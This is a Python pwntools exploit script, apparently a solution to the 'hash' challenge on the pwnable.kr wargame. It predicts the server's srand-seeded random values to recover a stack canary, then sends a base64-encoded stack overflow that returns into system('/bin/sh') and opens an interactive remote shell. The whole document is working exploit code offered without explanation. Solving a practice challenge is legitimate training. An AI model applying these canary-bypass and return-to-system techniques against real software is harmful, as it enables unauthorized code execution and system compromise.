from pwn import *
from ctypes import CDLL
import base64
context.log_level='debug'

libc = CDLL('libc.so.6')
def get_canary(timestamp,ran_val):
    libc.srand(timestamp)
    rands = []
    for i in range(8):
        rands.append(libc.rand())
    res = rands[4]-rands[6]+rands[7]+rands[2]-rands[3]+rands[1]+rands[5]
    canary =  ran_val-res
    if canary<0:
        canary = util.fiddling.negate(-canary)
    return canary

sh = ssh('fix', 'pwnable.kr', port=2222, password='guest')
get_time = sh.process('date +%s',shell=True)
io = sh.remote('0',9002)

#get_time = process('date +%s',shell=True)
#io = process('./hash')

timestamp = int(get_time.recvline().strip('\n'))
get_time.close()
io.recvuntil(' : ')
ran_val = int(io.recvline().strip())
print("ran_val:"+str(ran_val))

canary = get_canary(timestamp,ran_val)

if canary%256!=0:
    print("canary error!")
    exit()

system_addr = 0x8049187
bin_sh =0x0804B3AC

payload = 'A'*512
payload += p32(canary)
payload += 'B'*12
payload += p32(system_addr)
payload += p32(bin_sh)
payload = base64.b64encode(payload)
print(len(payload))
payload += '/bin/sh\x00'

io.sendline(str(ran_val))
io.recvuntil('then paste me!')
io.send(payload)
io.interactive()